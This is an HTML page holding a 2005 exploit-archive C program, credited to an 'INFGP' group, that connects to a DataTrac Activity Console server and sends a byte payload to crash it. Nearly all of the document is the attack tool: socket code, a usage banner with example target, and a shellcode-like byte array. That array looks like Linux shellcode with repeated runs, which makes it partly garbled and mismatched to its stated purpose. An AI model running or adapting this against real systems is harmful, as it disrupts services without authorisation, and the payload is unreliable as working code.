<html>
<head>
<title>DataTrac Activity Console Denial of Service Exploit</title>
<pre>
/*

DataTrac Activity Console DoS Exploit
----------------------------------------
 INFGP - Hacking&amp;security Research

Resolve host... [OK]
[+] Connecting... [OK]
Target locked
Sending bad procedure... [OK]
[+] Server DoS'ed

Greats: Infam0us Gr0up,Yudha(mephisthopeles),Kavling Community,
1st Indonesian Security,Jasakom,ECHO,etc..betst reagrds t0 whell.
Info: 98.to/infamous

*/

#include &lt;string.h&gt;
#include &lt;winsock2.h&gt;
#include &lt;stdio.h&gt;

#pragma comment(lib, &quot;ws2_32.lib&quot;)

char doscore[] =
&quot;\xeb\x6e\x5e\x29\xc0\x89\x46\x10&quot;
&quot;\x40\x89\xc3\x89\x46\x0c\x40\x89&quot;
&quot;\x46\x08\x8d\x4e\x08\xb0\x66\xcd&quot;
&quot;\x40\x89\xc3\x89\x46\x0c\x40\x89&quot;
&quot;\x46\x08\x8d\x4e\x08\xb0\x66\xcd&quot;
&quot;\x80\x43\xc6\x46\x10\x10\x88\x46&quot;
&quot;\x08\x31\xc0\x31\xd2\x89\x46\x18&quot;
&quot;\xb0\x90\x66\x89\x46\x16\x8d\x4e&quot;
&quot;\x14\x89\x4e\x0c\x8d\x4e\x08\xb0&quot;
&quot;\x66\xcd\x80\x89\x5e\x0c\x43\x43&quot;
&quot;\xb0\x66\xcd\x80\x89\x56\x0c\x89&quot;
&quot;\x08\x31\xc0\x31\xd2\x89\x46\x18&quot;
&quot;\xb0\x90\x66\x89\x46\x16\x8d\x4e&quot;
&quot;\x14\x89\x4e\x0c\x8d\x4e\x08\xb0&quot;
&quot;\x56\x10\xb0\x66\x43\xcd\x80\x86&quot;
&quot;\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0&quot;
&quot;\x14\x89\x4e\x0c\x8d\x4e\x08\xb0&quot;
&quot;\x66\xcd\x80\x89\x5e\x0c\x43\x43&quot;
&quot;\xb0\x66\xcd\x80\x89\x56\x0c\x89&quot;
&quot;\x56\x10\xb0\x66\x43\xcd\x80\x86&quot;
&quot;\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0&quot;
&quot;\x3f\x41\xcd\x80\xb0\x3f\x41\xcd&quot;
&quot;\x80\x88\x56\x07\x89\x76\x0c\x87&quot;
&quot;\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80&quot;
&quot;\xe8\x8d\xff\xff&quot;;

int main(int argc, char *argv[])
{
WSADATA wsaData;
WORD wVersionRequested;
struct hostent *pTarget;
struct sockaddr_in sock;
char *target;
int port,bufsize;
SOCKET inetdos;

if (argc &lt; 2)
{
printf(&quot;     DataTrac Activity Console DoS Exploit \n&quot;, argv[0]);
printf(&quot;  ------------------------------------------\n&quot;, argv[0]);
printf(&quot;      INFGP - Hacking&amp;Security Research\n\n&quot;, argv[0]);
printf(&quot;[-]Usage: %s [target] [source port]\n&quot;, argv[0]);
printf(&quot;[?]Exam: %s localhost 13\n&quot;, argv[0]);
exit(1);
}

wVersionRequested = MAKEWORD(1, 1);
if (WSAStartup(wVersionRequested, &amp;wsaData) &lt; 0) return -1;

target = argv[1];
port = 80;

if (argc &gt;= 3) port = atoi(argv[2]);
bufsize = 1024;
if (argc &gt;= 4) bufsize = atoi(argv[3]);

inetdos = socket(AF_INET, SOCK_STREAM, 0);
if(inetdos==INVALID_SOCKET)
{
printf(&quot;Socket ERROR \n&quot;);
exit(1);
}
printf(&quot;     DataTrac Activity Console DoS Exploit \n&quot;, argv[0]);
printf(&quot;  ------------------------------------------\r\n\n&quot;, argv[0]);
printf(&quot;Resolve host... &quot;);
if ((pTarget = gethostbyname(target)) == NULL)
{
printf(&quot;FAILED \n&quot;, argv[0]);
exit(1);
}
printf(&quot;[OK]\n &quot;);
memcpy(&amp;sock.sin_addr.s_addr, pTarget-&gt;h_addr, pTarget-&gt;h_length);
sock.sin_family = AF_INET;
sock.sin_port = htons((USHORT)port);

printf(&quot;[+] Connecting... &quot;);
if ( (connect(inetdos, (struct sockaddr *)&amp;sock, sizeof (sock) )))
{
printf(&quot;FAILED\n&quot;);
exit(1);
}
printf(&quot;[OK]\n&quot;);
printf(&quot;Target locked\n&quot;);
printf(&quot;Sending bad procedure... &quot;);
if (send(inetdos, doscore, sizeof(doscore)-1, 0) == -1)
{
printf(&quot;ERROR\n&quot;);
closesocket(inetdos);
exit(1);
}
printf(&quot;[OK]\n &quot;);
printf(&quot;[+] Server DoS'ed\n&quot;);
closesocket(inetdos);
WSACleanup();
return 0;
}

// milw0rm.com [2005-05-06]
</pre>
</html>

